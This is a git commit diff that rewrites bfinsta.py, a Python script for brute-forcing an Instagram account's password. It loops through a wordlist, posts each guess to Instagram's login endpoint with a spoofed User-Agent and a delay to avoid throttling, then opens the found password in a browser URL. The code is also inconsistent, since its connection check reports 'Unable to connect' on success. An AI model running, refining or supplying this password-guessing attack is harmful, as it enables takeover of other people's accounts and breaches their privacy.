c3a7b6b49b0db8aa59e0e2b4f62e4b49ea80b68b
coachini <mattewsilva77@gmail.com>
2025-03-25 20:02:41 -0300

    bfinsta.py

--- bfinsta.py
+++ bfinsta.py
@@ -1,24 +1,49 @@
 import requests
+import webbrowser
+from time import sleep
+
+def check_connection():
+    try:
+        response = requests.get('https://www.instagram.com/accounts/login/')
+        if response.status_code == 200:
+            print('Unable to connect to Instagram.')
+            return True
+        else:
+            print('')
+            return False
+    except requests.exceptions.RequestException as e:
+        print(f'Erro ao verificar conexão: {str(e)}')
+        return False
 
 def brute_force_instagram(username, wordlist_file):
-    with open(wordlist_file, 'r', encoding='utf-8', errors='ignore') as file:
-        passwords = file.readlines()
-        total_passwords = len(passwords)
-        counter = 0
-        for password in passwords:
-            password = password.strip()
-            counter += 1
-            print(f'Attempt {counter}/{total_passwords}')
-            try:
-                response = requests.post('https://www.instagram.com/accounts/login/ajax/',
-                                         data={'username': username, 'password': password})
-                if 'authenticated' in response.text:
-                    print(f'Found Password: {password}')
-                    break
-            except requests.exceptions.RequestException as e:
-                print(f'Error trying the password: {password} - {str(e)}')
+    if check_connection():
+        with open(wordlist_file, 'r', encoding='iso-8859-1', errors='ignore') as file:
+            passwords = file.readlines()
+            total_passwords = len(passwords)
+            counter = 0
+            for password in passwords:
+                password = password.strip()
+                counter += 1
+                print(f'Tentativa {counter}/{total_passwords} - Senha: {password}')
+                try:
+                    response = requests.post('https://www.instagram.com/accounts/login/ajax/',
+                                             data={'username': username, 'password': password},
+                                             headers={'User-Agent': 'Mozilla/5.0'})
+                    if response.status_code == 200 and 'authenticated' in response.text:
+                        print(f'Password found: {password}')
+                        open_instagram(username, password)
+                        break
+                    sleep(1)  # Aguarda 1 segundo entre as tentativas
+                except requests.exceptions.RequestException as e:
+                    print(f'Error trying password: {password} - {str(e)}')
+    else:
+        print('Unable to connect to Instagram.')
 
-# Usage example
-username = 'the instagram profile'
+def open_instagram(username, password):
+    url = f'https://www.instagram.com/accounts/login/?username={username}&password={password}'
+    webbrowser.open(url)
+
+# Change the username and wordlist
+username = 'profile'
 wordlist_file = 'rockme.txt'
 brute_force_instagram(username, wordlist_file)
